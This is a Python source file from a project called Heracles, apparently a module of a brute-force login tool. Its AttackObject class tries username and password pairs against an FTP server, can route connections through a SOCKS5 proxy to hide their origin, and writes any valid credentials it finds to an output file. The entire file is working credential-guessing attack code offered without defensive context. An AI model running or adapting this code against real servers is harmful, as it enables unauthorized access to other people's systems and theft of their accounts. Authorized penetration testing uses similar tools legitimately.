"""
Project:Heracles
Version:0.1
Site:http://darkpy.net/python/Heracles/

Author(s):
    v0mit: v0mit@darkpy.net
"""
import logging, sys
from ftplib import FTP


class AttackObject():
    def __init__(self, options, l_lvl=20):
        self.options = options
        self.address = options.get("host")
        if l_lvl == 10:
            logging.basicConfig(stream=sys.stderr, level=l_lvl,
                format='[%(levelname)s] (%(thread)d) %(message)s')
        else:
            logging.basicConfig(stream=sys.stderr, level=l_lvl,
                format='[%(levelname)s] %(message)s')

    def doLogin(self, user, passwd, proxy=None):

        #Installing SOCK proxy
        if proxy:
            import socket

            try:
                import socks
            except ImportError:
                logging.critical("sock module not installed.")
                return

            ip, port = proxy.split(":")
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, int(port))
            socket.socket = socks.socksocket

        ftp = FTP(self.address) #Connecting

        try:
            ftp.login(user, passwd) #Try to login
        except Exception:
            logging.debug("{0}:{1} failed.".format(user, passwd))
            return None

        logging.info("Valid user found. {0}:{1}".format(user, passwd))

        if self.options.get("output_file"):
            try:
                output_file = open(self.options.get("output_file"), "a")
                output_file.write("{0}:{1}".format(user, passwd))
                output_file.close()
            except IOError as errno:
                logging.warning(errno)
            finally:
                return user, passwd


